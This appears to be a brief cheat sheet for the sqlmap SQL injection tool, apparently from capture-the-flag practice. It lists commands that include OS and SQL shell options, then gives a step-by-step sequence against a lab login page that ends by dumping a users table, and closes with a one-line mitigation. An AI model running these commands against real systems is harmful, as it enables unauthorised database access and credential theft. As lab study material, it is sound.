# SQLMAP

## Commands
- ```sqlmap --help```
- ```sqlmap -u [target url]```
- ```sqlmap -u [target url] --os-shell```
- ```sqlmap -u [target url] --sql-shell```

## Example
- Login page
```
sqlmap -u https://admin-portal.htb/login.php --form --dbs
sqlmap -u https://admin-portal.htb/login.php --dbms=mysql --data "email=test@test.nz&password=pass"
sqlmap -u https://admin-portal.htb/login.php --dbms=mysql --data "email=test@test.nz&password=pass" --dbs
sqlmap -u https://admin-portal.htb/login.php --dbms=mysql --data "email=test@test.nz&password=pass" -D admin --tables
sqlmap -u https://admin-portal.htb/login.php --dbms=mysql --data "email=test@test.nz&password=pass" -D admin -T users --columns
sqlmap -u https://admin-portal.htb/login.php --dbms=mysql --data "email=test@test.nz&password=pass" -D admin -T users --dump
```

## Mitigation
- Use parametrized statements, separate data from sql code
